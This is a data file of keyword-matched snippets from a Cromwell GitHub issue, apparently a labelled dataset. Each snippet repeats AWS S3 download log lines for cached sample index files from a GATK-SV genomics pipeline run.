s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-45/cacheCopy/SR00c.HG02002.txt.gz.tbi; 1608597281347,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-70/cacheCopy/SR00c.HG02855.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:92949,cache,cacheCopy,92949,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-35/cacheCopy/SR00c.HG01747.txt.gz; 1608597567063,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-49/cacheCopy/SR00c.HG02069.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-49/cacheCopy/SR00c.HG02069.txt.gz.tbi; 1608597569034,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-81/cacheCopy/SR00c.HG03449.txt.gz.tbi; 1608597571205,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4e",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:175514,cache,cacheCopy,175514,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-37/cacheCopy/SR00c.HG01794.txt.gz; 1608596971072,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-31/cacheCopy/SR00c.HG01507.txt.gz.tbi; 1608596972311,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi; 1608596974147,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:9423,cache,cacheCopy,9423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz; 1608597382846,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi; 1608597384680,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi; 1608597386501,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:120992,cache,cacheCopy,120992,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-52/cacheCopy/SR00c.HG02221.txt.gz; 1608597619328,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-24/cacheCopy/SR00c.HG01325.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-24/cacheCopy/SR00c.HG01325.txt.gz.tbi; 1608597622374,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz; 1608597624684,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:188565,cache,cacheCopy,188565,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz; 1608597508511,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-88/cacheCopy/SR00c.HG03694.txt.gz.tbi; 1608597509827,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-113/cacheCopy/SR00c.NA18549.txt.gz.tbi; 1608597511949,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-142/cacheCopy/SR00c.NA20320.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerg",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:158419,cache,cacheCopy,158419,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz; 1608597473978,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi; 1608597475239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi; 1608597478676,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:147843,cache,cacheCopy,147843,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-69/cacheCopy/SR00c.HG02658.txt.gz; 1608596985970,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-28/cacheCopy/SR00c.HG01393.txt.gz.tbi; 1608596987867,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-79/cacheCopy/SR00c.HG03370.txt.gz.tbi; 1608596990438,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-7/cacheCopy/SR00c.HG00277.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4ea",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:13790,cache,cacheCopy,13790,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-72/cacheCopy/SR00c.HG03007.txt.gz; 1608597626312,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-92/cacheCopy/SR00c.HG03744.txt.gz.tbi; 1608597627949,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-34/cacheCopy/SR00c.HG01709.txt.gz.tbi; 1608597629983,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-46/cacheCopy/SR00c.HG02010.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMergin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:190430,cache,cacheCopy,190430,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-76/cacheCopy/SR00c.HG03100.txt.gz; 1608597312994,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-22/cacheCopy/SR00c.HG01112.txt.gz.tbi; 1608597315649,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-19/cacheCopy/SR00c.HG00844.txt.gz; 1608597317794,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-15/cacheCopy/SR00c.HG00599.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf01",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:102298,cache,cacheCopy,102298,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"64-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz; 1608597018214,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-11/cacheCopy/SR00c.HG00375.txt.gz.tbi; 1608597021127,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-134/cacheCopy/SR00c.NA19678.txt.gz; 1608597023863,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-126/cacheCopy/SR00c.NA19143.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:22523,cache,cacheCopy,22523,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
